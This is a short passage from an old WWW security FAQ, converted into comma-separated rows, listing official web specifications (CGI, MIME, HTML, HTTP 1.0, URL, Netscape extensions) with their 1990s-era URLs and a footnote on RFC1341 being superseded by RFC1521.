http://www-genome.wi.mit.edu/WWW/faqs/www-security-faq.html,NA,NA
WWW Server Information,NA,NA
Official Specifications,NA,NA
E.6 Official Specifications,NA,NA
CGI ,NA,NA
http://hoohoo.ncsa.uiuc.edu/cgi/interface.html,NA,NA
MIME (RFC1341)[1] ,NA,NA
http://www.w3.org/hypertext/WWW/Protocols/rfc1341/0_TableOfContents.html,NA,NA
HTML ,NA,NA
http://www.w3.org/hypertext/WWW/MarkUp/HTML.html,NA,NA
HTML 2.0 and 3.0,NA,NA
 ftp://www.ics.uci.edu/pub/ietf/html/index.html,NA,NA
Netscape ,NA,NA
Extensions to ,NA,NA
HTML,NA,NA
HTTP 1.0,NA,NA
URL,NA,NA
http://home.netscape.com/assist/net_sites/html_extensions.html ,NA,NA
http://www.w3.org/hypertext/WWW/Protocols/HTTP/HTTP2.html ,NA,NA
http://www.w3.org/hypertext/WWW/Addressing/Addressing.html,NA,NA
Footnotes:,NA,NA
[1] RFC1341 has been made obsolete by RFC1521; there is (as of this printing) no ,NA,NA
version of the new specification online. Check the above URL for the new specification ,NA,NA
as it becomes available.,NA,NA
Online Documentation,NA,NA
